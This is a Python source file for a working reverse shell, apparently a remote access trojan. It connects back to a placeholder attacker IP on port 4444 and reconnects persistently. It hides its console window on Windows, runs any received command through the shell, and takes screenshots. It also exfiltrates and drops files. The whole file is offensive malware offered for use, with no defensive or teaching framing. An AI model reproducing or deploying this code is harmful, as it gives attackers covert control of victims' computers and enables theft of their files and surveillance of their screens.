import socket
import subprocess
import os
import threading
import time
import base64
import sys
import platform
from datetime import datetime

class ReverseShell:
    def __init__(self, host='YOUR_IP_HERE', port=4444):
        self.host = host
        self.port = port
        self.running = True
    
    def connect(self):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.host, self.port))
                self.session(s)
            except:
                time.sleep(5)
    
    def session(self, s):
        # Hide console window on Windows
        if platform.system() == "Windows":
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        
        s.send(b"[+] Connected to server\n")
        
        while self.running:
            try:
                s.send(b"$ ")
                cmd = s.recv(4096).decode('utf-8', errors='ignore').strip()
                
                if cmd.lower() in ['quit', 'exit']:
                    break
                
                elif cmd.lower() == 'sysinfo':
                    info = self.get_sysinfo()
                    s.send(info.encode())
                    continue
                
                elif cmd.lower() == 'screenshot':
                    path = self.take_screenshot()
                    if path:
                        s.send(f"[+] Screenshot taken: {path}\n".encode())
                    else:
                        s.send(b"[-] Screenshot failed\n")
                    continue
                
                elif cmd.startswith('download '):
                    file_path = cmd[9:].strip()
                    self.send_file(s, file_path)
                    continue
                
                elif cmd.startswith('upload '):
                    file_path = cmd[7:].strip()
                    self.receive_file(s, file_path)
                    continue
                
                # Execute command
                result = subprocess.run(
                    cmd, shell=True, capture_output=True,
                    text=True, timeout=30
                )
                output = f"STDOUT:\n{result.stdout}\nSTDERR:\n{result.stderr}\n"
                s.send(output.encode())
                
            except Exception as e:
                s.send(f"[-] Error: {str(e)}\n".encode())
        
        s.close()
        self.running = False
    
    def get_sysinfo(self):
        try:
            import psutil
            return f"""
OS: {platform.system()} {platform.release()}
Arch: {platform.machine()}
User: {os.getlogin()}
PID: {os.getpid()}
"""
        except:
            return "[+] Sysinfo unavailable\n"
    
    def take_screenshot(self):
        try:
            import pyautogui
            screenshot = pyautogui.screenshot()
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            path = f"screen_{timestamp}.png"
            screenshot.save(path)
            return path
        except:
            return None
    
    def send_file(self, s, file_path):
        try:
            if os.path.exists(file_path):
                s.send(f"[+] Sending {os.path.getsize(file_path)} bytes\n".encode())
                with open(file_path, 'rb') as f:
                    while True:
                        data = f.read(4096)
                        if not data: break
                        try:
                            s.send(data)
                        except: break
                s.send(b"[+] Transfer complete\n")
            else:
                s.send(b"[-] File not found\n")
        except Exception as e:
            s.send(f"[-] Error: {str(e)}\n".encode())
    
    def receive_file(self, s, file_path):
        try:
            s.send(b"[+] Ready to receive\n")
            with open(file_path, 'wb') as f:
                while True:
                    data = s.recv(4096)
                    if not data: break
                    f.write(data)
            s.send(b"[+] File received\n")
        except Exception as e:
            s.send(f"[-] Error: {str(e)}\n".encode())

if __name__ == "__main__":
    # Replace with your IP
    shell = ReverseShell(host='YOUR_IP_HERE', port=4444)
    
    # Start in background
    thread = threading.Thread(target=shell.connect)
    thread.daemon = True
    thread.start()
    
    # Keep running
    while True:
        time.sleep(60)
